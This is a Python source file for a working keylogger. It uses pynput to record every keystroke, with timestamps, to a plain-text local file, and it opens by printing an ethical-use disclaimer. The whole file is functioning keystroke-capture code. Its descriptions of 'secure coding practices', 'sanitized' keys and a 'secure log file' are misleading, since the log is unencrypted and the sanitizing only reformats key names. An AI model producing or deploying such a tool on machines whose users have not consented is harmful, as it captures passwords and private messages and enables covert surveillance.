"""
Simple Keylogger Program

Description:  
This keylogger captures and logs keystrokes with timestamps
using secure coding practices.
"""

import sys
import logging
from datetime import datetime
from pynput import keyboard


# Constants
LOG_FILE = "keylog.txt"
TIME_FORMAT = "%m/%d/%Y %H:%M:%S"
DISCLAIMER = (
    "WARNING: This program is a keylogger and should only be used for ethical "
    "and authorized purposes. Do not use this tool maliciously."
)

def initialize_logger():
    """
    Initializes the logging framework to log keystrokes to a file.
    """
    try:
        logging.basicConfig(
            filename=LOG_FILE,
            level=logging.INFO,
            format="%(asctime)s - %(message)s",
            datefmt=TIME_FORMAT,
        )
    except Exception as e:
        print(f"[ERROR] Failed to initialize logging: {e}")
        sys.exit(1)

def sanitize_key(key):
    """
    Sanitizes the key input to ensure safe logging.
    Converts special keys to readable strings.
    """
    try:
        return key.char  # Alphanumeric keys
    except AttributeError:
        return str(key).replace("Key.", "")  # Special keys

def log_keystroke(key):
    """
    Logs the pressed key with a timestamp into a secure log file.
    """
    sanitized_key = sanitize_key(key)
    logging.info(sanitized_key)

def display_disclaimer():
    """
    Displays a disclaimer about the ethical use of the program.
    """
    print(DISCLAIMER)

def main():
    """
    Starts the keyboard listener securely.
    """
    display_disclaimer()
    print("[INFO] Keylogger started. Press Ctrl+C to stop.")
    initialize_logger()

    try:
        with keyboard.Listener(on_press=log_keystroke) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("[INFO] Keylogger stopped by user.")
    except ImportError:
        print("[ERROR] 'pynput' is not installed. Please install using 'pip install pynput'.")
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
    finally:
        print("[INFO] Exiting program.")
        sys.exit(0)

if __name__ == "__main__":
    main()
